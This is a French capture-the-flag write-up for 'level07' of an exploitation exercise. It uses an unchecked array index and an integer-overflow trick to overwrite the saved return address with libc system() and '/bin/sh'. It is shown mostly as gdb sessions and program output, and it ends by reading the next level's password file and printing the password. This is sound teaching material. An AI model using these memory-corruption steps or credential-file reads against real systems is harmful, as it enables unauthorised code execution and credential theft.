# Level 07

Le programme permet de stocker des nombres dans un tableau et d'y accéder par la suite avec la compréhension de commande `store`, `read` et `quit`.

Le tableau des nombres est limiter à 100, mais le programme ne verifie pas l'index choisi par l'utilisateur pour enregistrer ou lire des nombre dans le tableau, cela nous permet de manipuler la mémoire.

Nous pouvons cependant pas écrire à tous les index, car certain son protégé par la condition `nb % 3 == 0`.

Notre but est donc d'essayer de réecrire EIP par l'adresse de la fonction `system("/bin/sh")`.

Nous devons récupérer l'adresse de l'EIP sous la forme d'un index du tableau.

```shell
~ gdb level07
(gdb) disas main
Dump of assembler code for function main:
   0x08048723 <+0>:	push   %ebp
   0x08048724 <+1>:	mov    %esp,%ebp
[...]
   0x08048928 <+517>:	mov    %eax,(%esp)
   0x0804892b <+520>:	call   0x80486d7 <read_number>		<--- Breakpoint
   0x08048930 <+525>:	mov    %eax,0x1b4(%esp)
---Type <return> to continue, or q <return> to quit---^CQuit
(gdb) b *0x0804892b
Breakpoint 1 at 0x804892b
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd700:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd6f8, args:
 Locals at 0xffffd6f8, Previous frame's sp is 0xffffd700
 Saved registers:
  ebx at 0xffffd6ec, ebp at 0xffffd6f8, esi at 0xffffd6f0, edi at 0xffffd6f4, eip at 0xffffd6fc
(gdb) p/d 0xffffd6fc
$1 = 4294956796
(gdb) info registers
eax            0xffffd534	-10956
[...]
(gdb) p/d 0xffffd534
$2 = 4294956340
(bc) 4294956796 - 4294956340
456
(bc) 456 / 4
114
(gdb) c
Continuing.
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) p/a 4158936339
$3 = 0xf7e45513 <__libc_start_main+243>
```

L'index de l'EIP est donc 114, le problème c'est que `114 % 3 = 0`, il faut donc trouver un autre index pour écrire sur l'eip.

Nous pouvons contourner ce problème avec un `int overflow`.

```shell
(bc) 4294967296 / 4
1073741824
(bc) 1073741824 + 114
1073741938
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 1073741938
 Completed store command successfully
Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd700:
 eip = 0x804892b in main; saved eip 0x2a
[...]
(gdb) p/d 0x2a
$4 = 42
(gdb) p system
$5 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p/d 0xf7e6aed0
$6 = 4159090384
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) p/d 0xf7f897ec
$7 = 4160264172
(gdb) quit
~ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42
 Completed read command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```



